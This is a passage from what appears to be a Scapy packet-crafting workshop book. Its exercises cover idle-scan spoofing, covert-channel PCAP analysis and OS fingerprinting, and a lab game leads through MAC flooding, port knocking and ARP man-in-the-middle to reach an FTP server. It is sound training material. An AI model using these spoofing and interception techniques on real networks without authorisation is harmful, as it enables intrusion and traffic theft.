<pre><code>&gt;&gt;&gt; lis = [0,0,0,0]
&gt;&gt;&gt; all(v == 0 for v in lis)       # Checking if all elements in list are zero
True 
</code></pre>
<pre><code>&gt;&gt;&gt; lis = [1,4,6,9,22,65,98,354]
&gt;&gt;&gt; 
&gt;&gt;&gt; all(x&lt;y for x, y in zip(lis, lis[1:]))  # Checking if the elements are in increasing order
True
</code></pre>
<h2 id="exercise-4"><a class="header" href="#exercise-4">Exercise 4</a></h2>
<h3 id="ip-id-scanner"><a class="header" href="#ip-id-scanner">IP ID scanner</a></h3>
<ul>
<li>Your might have found a potential ‘zombie’ from the previous scan</li>
<li>Write a script that takes a <code>zombie_ip</code>, <code>victim_ip</code>. <code>victim_port</code> Performs a ipid scan (Details in the notes)</li>
</ul>
<p>For more detailed discussion: Idle scan</p>
<p>Example:</p>
<pre><code>$ sudo python ipidscanner.py 192.168.56.102 192.168.56.103 4444

[+] Sending syn-ack to zombie
[+] Recording initial IPID

[+] Sending spoofed syn to victim

[+] Sending syn-ack to zombie
[+] Recording final IPID

[*] Initial IPID of zombie: 14
[*] Final IPID of zombie: 16

The port 4444 on 192.168.56.103 is open
</code></pre>
<h4 id="pythonscapy-tips-1"><a class="header" href="#pythonscapy-tips-1">Python/Scapy tips:</a></h4>
<ul>
<li>Use <code>sr1()</code> or <code>send()</code> to send packets</li>
<li>Send <code>sr1()</code> and other packet sending functions take an extra argument verbose, set <code>verbose=0</code> to avoid scapy output</li>
</ul>
<h4 id="solution"><a class="header" href="#solution">Solution</a></h4>
<p>idle scan consists of three steps that are repeated for each port:</p>
<ul>
<li>Probe the zombie’s IPID and record it. (Send a syn-ack to zombie, record ipid in response)</li>
<li>Forge a SYN packet with zombie IP as source and victim IP, victim port as destination.</li>
<li>Probe the zombie’s IP ID again. The target port state is then determined by comparing this new IP ID with the one recorded in step 1.</li>
<li>At this point, if the zombie’s IPID increased by one that the zombie hasn’t sent out any packets, except for its reply to the attacker’s probe. THis is an indication that the target port might be closed on victim.</li>
<li>If the zombie’s IPID increased by two, it means the zombie sent out a packet between the two probes. This is an indication that the target port is open on the victim.</li>
<li>If zombie IPIP increases by more than two, it usually indicates a bad zombie host. It might not have predictable IPID numbers, or might be engaged in communication unrelated to the idle scan.</li>
</ul>
<h2 id="exercise-5"><a class="header" href="#exercise-5">Exercise 5</a></h2>
<h3 id="packet-hunting"><a class="header" href="#packet-hunting">Packet hunting</a></h3>
<ul>
<li>You are given a PCAP file - <a href="https://github.com/0xbharath/art-of-packet-crafting-with-scapy/blob/master/pcaps/Boston2016.pcap">boston2016</a>, this PCAP is suspected to be having covert channel activity. (someone trying to transfer data in a packet using unsual methods)</li>
<li>Your task is to analyze this packet capture and find out the hidden data.</li>
</ul>
<h4 id="pythonscapy-tips-2"><a class="header" href="#pythonscapy-tips-2">Python/Scapy tips:</a></h4>
<ul>
<li><code>rdpcap</code> to read a pcap</li>
<li><code>packet[protocol]</code> to extract protocol specific content</li>
<li><code>packet[protocol].field</code> to extract field</li>
<li><code>format(text,'04x')</code> is how you format into proper hex format in Python.</li>
<li>Use <code>join</code> method to join elements of a list <code>&quot;.&quot;.join([192, 168, 99, 24]) –&gt; 192.168.99.24</code></li>
</ul>
<h4 id="solution-hints-i"><a class="header" href="#solution-hints-i">Solution hints I:</a></h4>
<p>This is not a packet analysis or CTF class so I’ll describe the solution in plain terms here, try to codify it using Scapy.</p>
<ul>
<li>The covert activity might be happening through UDP checksums.</li>
</ul>
<h4 id="solution-hints-ii"><a class="header" href="#solution-hints-ii">Solution hints II:</a></h4>
<p>Spoilers ahead</p>
<ul>
<li>The data is being exfiltrated by one party through checksums.</li>
<li>To be specific, UDP checksums in DNS queries is where the data is. - Extract the checksums from DNS queries.</li>
<li>You have to read the checksums in “0x:(hex) format first. format(text,'0x')</li>
<li>Decode the hex checksums into ascii and that’s the exfiltrated data.</li>
</ul>
<h2 id="exercise-6"><a class="header" href="#exercise-6">Exercise 6</a></h2>
<h3 id="packet-analysis"><a class="header" href="#packet-analysis">Packet analysis</a></h3>
<p>Given a pcap file, find all the unique hosts in that pcap file and try and determine their OS.</p>
<pre><code>$ python list_scan.py evidence.pcap

List of all the hosts and possible OS
-------------------------------------
192.168.56.0   - Linux
45.65.29.124   - Windows
198.56.101.2   - Linux
</code></pre>
<h2 id="exercise-7"><a class="header" href="#exercise-7">Exercise 7</a></h2>
<h3 id="dummy-network-scanner"><a class="header" href="#dummy-network-scanner">Dummy network scanner</a></h3>
<p>A client wants you to do a security audit on their network. Client provided you with a network range to scan and set of IP addresses to exclude from scan.</p>
<p>Before you run an actual network scan, write a script that lists all the IP addresses that falls under scan(similar to Nmap list scan). (Network range provided by client minus IP addresses to be excluded)</p>
<p>Example:</p>
<pre><code>$ python list_scan.py --range 192.168.56.1/30 --exclude 192.168.56.2
Range   =&gt; IPSet(['192.168.56.1/30'])
Exclude =&gt; IPSet(['192.168.56.2/32'])
192.168.56.0
192.168.56.1
192.168.56.3
</code></pre>
<p>Hints:</p>
<ul>
<li><code>netaddr</code> library deals with Layer 3 addressing</li>
<li><code>netaddr.IPSet</code> has a remove method to remove elements</li>
</ul>
<h2 id="exercise-8"><a class="header" href="#exercise-8">Exercise 8</a></h2>
<h3 id="local-network-interface-enumeration"><a class="header" href="#local-network-interface-enumeration">Local network interface enumeration.</a></h3>
<ul>
<li>Use a python library to list all the interfaces on your machine, find as much as you can(interface labels, addressing etc).</li>
<li>When you print the output, make sure it’s easily readable.</li>
</ul>
<p>Hints:</p>
<ul>
<li><code>netifaces</code> helps enumerate local interfaces</li>
<li><code>string .format</code> method and pprint helps you print stuff beautifully in Python</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-hunt-1"><a class="header" href="#network-hunt-1">Network Hunt</a></h1>
<p>Let’s go Network hunting!</p>
<h2 id="challenge-overview"><a class="header" href="#challenge-overview">Challenge Overview</a></h2>
<p>Terminal-based game in which you will use common network attack vectors and penetration testing methods to analyze and compromise a virtual network.</p>
<p>Involves Network Security challenges designed to educate users on packet manipulation and common network attacks.</p>
<p>The whole challenge happens over sort of a software defined network(SDN).</p>
<p>Originally created by James Sullivan (MIT License), modified by us for the workshop.</p>
<h2 id="network-hunt-2"><a class="header" href="#network-hunt-2">Network Hunt</a></h2>
<ul>
<li>The network hunt is a simple Software Defined Network</li>
<li>The network is completely defined by handcrafted packets using Scapy/Python which simulates a typical network setup.</li>
</ul>
<h2 id="the-goal-1"><a class="header" href="#the-goal-1">The Goal</a></h2>
<p>There is an FTP server some where on the network containing a document:</p>
<ul>
<li>Locate the FTP server</li>
<li>Connect to the service &amp;</li>
<li>Retrieve the secret file!</li>
</ul>
<h2 id="concepts"><a class="header" href="#concepts">Concepts</a></h2>
<ul>
<li>Bash terminal-fu</li>
<li>Packet capture and manipulation in Scapy</li>
<li>Packet analysis in Wireshark</li>
<li>Router modes of operation</li>
<li>Network topography, gateways</li>
<li>Basic telnet/nc commands</li>
</ul>
<h2 id="hints"><a class="header" href="#hints">Hints</a></h2>
<ul>
<li>You may need to find a way to see all of the traffic on the network</li>
<li>Other clients on the network might give you useful clues, if you can coerce them</li>
<li>The target will most likely be isolated from the immediate local network, and will have some preferred clients</li>
</ul>
<h2 id="tasks"><a class="header" href="#tasks">TASKS</a></h2>
<h3 id="task-1"><a class="header" href="#task-1">TASK 1</a></h3>
<ul>
<li>Run the script &amp; find the details about the new interface(ipconfig, route).</li>
</ul>
<h3 id="task-2"><a class="header" href="#task-2">TASK 2</a></h3>
<p>Understand the network.</p>
<ul>
<li>Is there any traffic on the network?</li>
<li>Are there devices connected to the network? Perform a network sweep?</li>
</ul>
<h3 id="task-3"><a class="header" href="#task-3">TASK 3</a></h3>
<p>How to gain access to traffic beyond a switch?</p>
<p>Think about exploiting the way layer 2 switches operate?</p>
<p>Scapy tips:</p>
<ul>
<li><code>RandMAC()</code> - Generates random MAC addresses.</li>
<li><code>RandIP()</code> - Generates random IP addresses.</li>
</ul>
<h3 id="task-4"><a class="header" href="#task-4">TASK 4</a></h3>
<p>Were you able to gain access to traffic beyond switch? If so, is there something interesting about the traffic? Is there some strange pattern in the traffic?</p>
<p>Hint: Port knocking. (Reference docs has more details on what port knocking is)</p>
<h3 id="task-5"><a class="header" href="#task-5">TASK 5</a></h3>
<p>Did you manage to get access to some service on some machine? try some standard commands for that service to get more hints.</p>
<h3 id="task-6"><a class="header" href="#task-6">TASK 6</a></h3>
<p>The target is not in the same sub-network and also accepts connections from only specific machines.How do you compromise the machine?</p>
<p>Hint: ARP MitM</p>
<h3 id="task-7"><a class="header" href="#task-7">TASK 7</a></h3>
<p>Retrive the payload using standard FTP commands.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="references"><a class="header" href="#references">References</a></h1>
<ul>
<li><a href="http://www.secdev.org/">Scapy documentation &amp; presentations</a></li>
<li><a href="https://nmap.org/book/">Nmap book</a></li>
<li><a href="http://thesprawl.org/research/scapy/#session">Scapy notes by iphelix</a></li>
<li><a href="https://securitywa.blogspot.in/2016/04/david-fletcher-boston-2016-pcap-lab.html">Boston2016 pcap discussion</a></li>
<li><a href="https://www.sans.org/reading-room/whitepapers/testing/taste-scapy-33249">Taste of Scapy by Judy Novak</a></li>
<li><a href="https://www.ihatefeds.com/promiscious.pdf">Detection of Promiscuous Nodes Using ARP Packets</a></li>
<li><a href="https://cyberang3l.wikispaces.com/HOWTO+-+ARP+Poisoning+in+Linux">How to arp spoof on Linux</a></li>
<li><a href="http://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting">Passive OS fingerprinting</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                        
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                            </nav>

        </div>

        
        
        
                <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        
        
                <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        
                        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
                
    </body>
</html>
